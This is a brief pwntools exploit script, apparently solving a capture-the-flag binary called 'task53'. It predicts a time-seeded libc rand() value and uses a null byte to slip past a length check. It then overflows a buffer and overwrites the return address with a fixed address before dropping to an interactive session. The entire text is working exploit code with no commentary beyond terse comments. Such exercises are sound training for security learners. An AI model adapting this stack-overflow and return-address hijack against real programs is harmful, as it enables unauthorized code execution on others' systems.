from pwn import *
from ctypes import CDLL

# get random from libc
libc = CDLL("libc.so.6")
libc.srand(libc.time(0))
r = libc.rand()

io = process("./task53")

io.recvuntil("Enter password:")

# gdb.attach(io)

addr = 0x004011f6
payload  = b'A' * 8 + b'\0' # bypass length check of 8
payload += b'A' * 35      # overflow until the return address
payload += p32(r)
payload += b'A' * 8
payload += p64(addr)        # override ret address
# io.send(payload)
io.sendline(payload)

# gdb.attach(io)
# pause()

io.interactive()
